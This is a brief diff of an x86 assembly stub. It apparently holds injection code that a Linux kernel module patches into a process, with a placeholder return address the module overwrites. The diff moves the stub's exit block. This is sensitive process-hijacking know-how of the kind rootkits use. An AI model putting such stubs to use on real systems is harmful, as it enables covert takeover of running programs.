@@ -9,14 +9,7 @@ _start:
 	; edx, edi, esi are NULL/0 as we do not need those parameters
 	int 80h
 	cmp eax, 0
-	jne short 0x0d	; Jump to _orig
-
-_new:
-	;add esp, 36
-	mov eax, 1
-	mov ebx, 0
-	int 80h
-	;ret
+	jne short 0x0f	; Jump to _orig
 
 _orig:
 	pop edi
@@ -29,3 +22,5 @@ _orig:
 	pop esp
 	push 0x01020304 ; This address will be replaced by the LKM
 	ret
+
+_new:
